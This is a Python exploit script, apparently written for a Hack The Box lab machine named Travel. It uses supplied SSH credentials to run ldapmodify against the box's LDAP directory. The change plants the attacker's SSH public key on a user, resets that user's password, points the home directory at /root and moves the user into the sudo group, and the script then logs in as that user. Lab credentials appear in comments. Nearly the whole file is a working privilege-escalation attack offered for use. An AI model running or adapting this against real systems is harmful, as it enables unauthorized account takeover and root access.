#!/usr/bin/python3

import os
import sys
import argparse


def exploit(rhost,username,password,passwd,ldappass):
    # username = "lynik-admin"
    # password = "1stepcloser"
    # passwd = "qweasd123"
    # rhost = "10.10.10.189"

    # check the ssh id_rsa.pub and id_rsa keys
    rsa_pub_path = os.path.expanduser("~/.ssh/id_rsa.pub")
    rsa_path = os.path.expanduser("~/.ssh/id_rsa")
    if not os.path.exists(rsa_path) and not os.path.exists(rsa_pub_path):
        print("[!] No SSH key on your Machine! Generate One using ssh-keygen")
        x = str(input("[*] Do you want to geneate one? Y/N"))
        if x.upper() == "y".upper():
            os.system("ssh-keygen")
        else:
            sys.exit(1)
    else:
        print("[*] ID_RSA and ID_RSA.PUB keys Found on your OS!")
    key=""

    check_sshpass = os.system("which sshpass > /dev/null")

    if check_sshpass != 0:
        print("[!] the 'sshpass' is not Installed")
        x = str(input("[*] Do you want to geneate one? Y/N"))
        if x.upper() == "y".upper():
            isinstalled = os.system("sudo apt install sshpass")
            if isinstalled != 0:
                print("[!] Cant Install sshpass on you box")
                sys.exit(1)
        else:
            print("[!] Exiting sshpass command not exist on you OS")
            sys.exit(1)
    else:
        print("[*] SSHPASS command Found on your OS!")

    with open(rsa_pub_path) as skey:
        key = skey.readlines()[0].strip()





    ldap_modify=f""" "ldapmodify -x -w {ldappass}" <<EOF 
dn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: homeDirectory
homeDirectory: /root
-
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: {key}
-
replace: userPassword
userPassword: {passwd.strip()}
-
replace: gidNumber
gidNumber: 27

EOF
    
    """
    #print (ldap_modify)
    ldap_search_cmd=f""" "ldapsearch -x -w {ldappass} '(&(objectClass=person)(uid=christopher))'" """


    #print(key)
    login = f'sshpass -p "{password}" ssh -o "StrictHostKeyChecking=no" -o "PreferredAuthentications=password" {username}@{rhost} '
    modify_cmd = login+ldap_modify
    #print(modify_cmd)
    os.system(modify_cmd)
    search_cmd = login + ldap_search_cmd
    #print(search_cmd)
    os.system(search_cmd)
    os.system(f"ssh christopher@{rhost}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-H","--rhost",action="store",type=str,help="IP of the Remote host or the Target Host",required=True)
    parser.add_argument("-U","--username",action="store",type=str,help="Username of the Target Host",required=True)
    parser.add_argument("-P","--password",action="store",type=str,help="Password of the Target Host",required=True)
    parser.add_argument("-l","--ldappass",action="store",type=str,help="ldap password",required=True)
    parser.add_argument("-p","--passwd",action="store",type=str,help="Reset password need to use with sudo command",required=True)
    args = parser.parse_args()
    exploit(args.rhost,args.username,args.password,args.passwd,args.ldappass)

if __name__ == "__main__":
    main()